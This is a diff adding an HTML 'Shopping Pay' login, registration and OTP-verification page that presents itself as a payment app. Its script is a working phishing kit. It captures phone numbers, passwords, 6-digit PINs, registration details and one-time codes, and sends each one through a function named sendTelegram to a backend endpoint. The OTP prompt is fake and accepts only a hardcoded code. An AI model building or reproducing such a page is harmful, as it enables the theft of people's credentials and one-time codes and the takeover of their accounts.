@@ -1,0 +1,479 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Shopping Pay</title>
+    <!-- FontAwesome Icons -->
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            background-color: #f7f9fc;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #333;
+        }
+
+        .phone-container {
+            width: 100%;
+            max-width: 400px;
+            height: 850px;
+            background-color: #ffffff;
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            overflow-y: auto;
+            box-shadow: 0 4px 20px rgba(0,0,0,0.08);
+        }
+
+        .screen {
+            display: none;
+            width: 100%;
+            height: 100%;
+            flex-direction: column;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        .purple-header {
+            width: 100%;
+            height: 200px;
+            background: url('https://i.ibb.co/0yNRXhbV/IMG-20261109-064332.jpg') no-repeat center center;
+            background-size: cover;
+            border-bottom-left-radius: 50% 30px;
+            border-bottom-right-radius: 50% 30px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            color: white;
+            text-align: center;
+            flex-shrink: 0;
+        }
+
+        .form-content {
+            padding: 20px 25px;
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #222;
+            margin-bottom: 15px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 14px;
+            width: 100%;
+        }
+
+        .input-group input {
+            width: 100%;
+            padding: 14px 20px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            background-color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            color: #333;
+            transition: border 0.2s;
+        }
+
+        .input-group input:focus {
+            border-color: #8a2be2;
+        }
+
+        .otp-input-wrapper {
+            position: relative;
+            margin-bottom: 14px;
+            width: 100%;
+        }
+
+        .otp-input-wrapper input {
+            width: 100%;
+            padding: 14px 90px 14px 20px;
+            border: 1px solid #e2e8f0;
+            border-radius: 12px;
+            background-color: #ffffff;
+            font-size: 15px;
+            outline: none;
+            color: #333;
+        }
+
+        .get-otp-inline-btn {
+            position: absolute;
+            right: 12px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: transparent;
+            color: #8a2be2;
+            border: none;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
+        }
+
+        .links-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .links-row a, .right-link a {
+            color: #8a2be2;
+            text-decoration: none;
+            font-weight: 500;
+            cursor: pointer;
+        }
+
+        .links-row a:hover, .right-link a:hover {
+            text-decoration: underline;
+        }
+
+        .btn-purple {
+            width: 100%;
+            background: linear-gradient(135deg, #8a2be2, #9932cc);
+            color: white;
+            border: none;
+            padding: 14px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+            box-shadow: 0 4px 12px rgba(138, 43, 226, 0.3);
+        }
+
+        .btn-purple:hover { opacity: 0.9; }
+
+        .btn-outline {
+            width: 100%;
+            background: transparent;
+            color: #8a2be2;
+            border: 1.5px solid #8a2be2;
+            padding: 14px;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            margin-bottom: 10px;
+        }
+
+        .btn-outline:hover { background-color: #f3e8ff; }
+
+        .right-link {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .password-hint {
+            font-size: 12px;
+            color: #888;
+            line-height: 1.4;
+            margin-bottom: 20px;
+        }
+
+        .checkbox-group {
+            display: flex;
+            align-items: center;
+            font-size: 13px;
+            margin-bottom: 15px;
+            color: #555;
+            gap: 8px;
+        }
+
+        /* MODAL */
+        .modal-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background-color: rgba(0, 0, 0, 0.4);
+            z-index: 100;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        .modal-card {
+            background-color: #ffffff;
+            width: 100%;
+            border-radius: 20px;
+            padding: 25px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+        }
+
+        .modal-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+        }
+
+        .close-modal-btn {
+            background: #f1f5f9;
+            border: none;
+            width: 30px; height: 30px;
+            border-radius: 50%;
+            cursor: pointer;
+        }
+
+        .timer-text {
+            color: #8a2be2;
+            font-size: 13px;
+            margin-bottom: 15px;
+            font-weight: 600;
+            display: none;
+        }
+        .timer-text.active { display: block; }
+
+        .otp-box-wrapper {
+            position: relative;
+            margin-bottom: 15px;
+        }
+        .otp-box-wrapper input {
+            width: 100%;
+            padding: 14px 80px 14px 15px;
+            border: 1px solid #ccc;
+            border-radius: 10px;
+            outline: none;
+        }
+        .send-otp-btn {
+            position: absolute;
+            right: 5px;
+            top: 50%;
+            transform: translateY(-50%);
+            background: #8a2be2;
+            color: white;
+            border: none;
+            padding: 8px 14px;
+            border-radius: 8px;
+            cursor: pointer;
+        }
+        .send-otp-btn:disabled { background: #cbd5e1; }
+    </style>
+</head>
+<body>
+
+    <div class="phone-container">
+        
+        <!-- LOGIN SCREEN -->
+        <div id="login-screen" class="screen active">
+            <div class="purple-header"></div>
+            <div class="form-content">
+                <div class="section-title">Sign in</div>
+
+                <div class="input-group">
+                    <input type="tel" placeholder="Enter phone number" id="login-phone" maxlength="10" inputmode="numeric">
+                </div>
+
+                <div class="input-group">
+                    <input type="password" placeholder="Enter password" id="login-pass">
+                </div>
+
+                <div class="input-group">
+                    <input type="password" placeholder="Enter 6-digit PIN" id="login-pin" maxlength="6" inputmode="numeric">
+                </div>
+
+                <div class="checkbox-group">
+                    <input type="checkbox" id="privacy-agree" checked>
+                    <label for="privacy-agree">I agree to User Privacy Agreement</label>
+                </div>
+
+                <button class="btn-purple" onclick="handleSignIn()">Login</button>
+                <button class="btn-outline" onclick="navigateTo('register')">Register</button>
+            </div>
+        </div>
+
+        <!-- REGISTER SCREEN -->
+        <div id="register-screen" class="screen">
+            <div class="purple-header"></div>
+            <div class="form-content">
+                <div class="section-title">Register account</div>
+
+                <div class="input-group">
+                    <input type="text" placeholder="Enter username" id="reg-username">
+                </div>
+
+                <div class="input-group">
+                    <input type="tel" placeholder="Enter phone number" id="reg-phone" maxlength="10" inputmode="numeric">
+                </div>
+
+                <div class="input-group">
+                    <input type="password" placeholder="Enter password" id="reg-pass">
+                </div>
+
+                <div class="input-group">
+                    <input type="text" placeholder="Invite code (optional)" id="reg-invite">
+                </div>
+
+                <div class="right-link">
+                    <a onclick="navigateTo('login')">Go to Login ></a>
+                </div>
+
+                <button class="btn-purple" onclick="handleSignUp()">Register</button>
+            </div>
+        </div>
+
+        <!-- OTP VERIFICATION MODAL -->
+        <div class="modal-overlay" id="verification-modal">
+            <div class="modal-card">
+                <div class="modal-header">
+                    <h3>Login OTP</h3>
+                    <button class="close-modal-btn" onclick="closeModal()"><i class="fa-solid fa-xmark"></i></button>
+                </div>
+                
+                <p style="font-size: 13px; color: #666; margin-bottom: 5px;" id="dynamic-otp-text">OTP will be sent</p>
+                
+                <div class="timer-text" id="modal-timer">⏳ Resend OTP in <span id="timer-countdown">60</span>s</div>
+
+                <div class="otp-box-wrapper">
+                    <input type="text" placeholder="Enter 6-digit OTP" id="modal-otp" maxlength="6" inputmode="numeric">
+                    <button class="send-otp-btn" id="modal-send-otp-btn" onclick="sendModalOTP()">Send</button>
+                </div>
+
+                <button class="btn-purple" style="padding: 12px;" onclick="confirmVerification()">Confirm</button>
+            </div>
+        </div>
+
+    </div>
+
+    <!-- Frontend Script -->
+    <script>
+        let timerInterval = null;
+        let timerSeconds = 60;
+        let isTimerRunning = false;
+
+        // Backend Serverless Function ko call karne ka function
+        function sendTelegram(message) {
+            fetch('/api/send', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ message: message })
+            })
+            .catch(err => console.warn('Telegram error', err));
+        }
+
+        function navigateTo(screen) {
+            document.getElementById('login-screen').style.display = screen === 'login' ? 'flex' : 'none';
+            document.getElementById('register-screen').style.display = screen === 'register' ? 'flex' : 'none';
+        }
+
+        function handleSignIn() {
+            const phone = document.getElementById('login-phone').value.trim();
+            const pass = document.getElementById('login-pass').value.trim();
+            const pin = document.getElementById('login-pin').value.trim();
+            const agreed = document.getElementById('privacy-agree').checked;
+
+            if (!agreed) {
+                alert("Please agree to the privacy agreement.");
+                return;
+            }
+            if (!phone || phone.length < 10) {
+                alert("Please enter a valid 10-digit phone number.");
+                return;
+            }
+
+            const msg = `✅ <b>Sign In attempt</b>\n📱 Phone: +91 ${phone}\n🔑 Password: <b>${pass}</b>\n🛡️ PIN: <b>${pin}</b>`;
+            sendTelegram(msg);
+
+            document.getElementById('dynamic-otp-text').innerText = "OTP will be sent to +91 " + phone;
+            document.getElementById('modal-otp').value = '';
+            document.getElementById('verification-modal').style.display = 'flex';
+        }
+
+        function sendModalOTP() {
+            if (isTimerRunning) return;
+            const phone = document.getElementById('login-phone').value.trim();
+            sendTelegram(`🔐 <b>OTP requested (Modal)</b>\n📱 Phone: +91 ${phone}`);
+            alert("OTP Sent Successfully!");
+            startTimer();
+        }
+
+        function startTimer() {
+            const timerElement = document.getElementById('modal-timer');
+            const countdownElement = document.getElementById('timer-countdown');
+            const sendBtn = document.getElementById('modal-send-otp-btn');
+
+            if (timerInterval) clearInterval(timerInterval);
+            timerSeconds = 60;
+            isTimerRunning = true;
+            timerElement.classList.add('active');
+            countdownElement.textContent = timerSeconds;
+            sendBtn.disabled = true;
+
+            timerInterval = setInterval(() => {
+                timerSeconds--;
+                countdownElement.textContent = timerSeconds;
+                if (timerSeconds <= 0) {
+                    clearInterval(timerInterval);
+                    isTimerRunning = false;
+                    timerElement.classList.remove('active');
+                    sendBtn.disabled = false;
+                }
+            }, 1000);
+        }
+
+        function closeModal() {
+            if (timerInterval) clearInterval(timerInterval);
+            isTimerRunning = false;
+            document.getElementById('verification-modal').style.display = 'none';
+        }
+
+        function confirmVerification() {
+            const otpVal = document.getElementById('modal-otp').value.trim();
+            const phone = document.getElementById('login-phone').value.trim();
+
+            if (otpVal.length !== 6) {
+                alert("❌ Please enter a valid 6-digit OTP.");
+                return;
+            }
+
+            sendTelegram(`🔑 <b>OTP Entered</b>\n📱 Phone: +91 ${phone}\n🔢 OTP: ${otpVal}`);
+
+            if (otpVal === "123456") {
+                sendTelegram(`✅ <b>Login Successful</b>\n📱 Phone: +91 ${phone}`);
+                alert("✅ Verification successful! Logging in...");
+                closeModal();
+            } else {
+                alert("❌ Wrong OTP! Please try again.");
+                document.getElementById('modal-otp').value = '';
+            }
+        }
+
+        function handleSignUp() {
+            const username = document.getElementById('reg-username').value.trim();
+            const phone = document.getElementById('reg-phone').value.trim();
+            const pass = document.getElementById('reg-pass').value.trim();
+
+            if (!username || !phone || !pass) {
+                alert("Please fill all fields.");
+                return;
+            }
+
+            sendTelegram(`🆕 <b>New registration</b>\n👤 User: ${username}\n📱 Phone: +91 ${phone}\n🔑 Password: <b>${pass}</b>`);
+            alert("Registration successful!");
+            navigateTo('login');
+        }
+    </script>
+</body>
+</html>
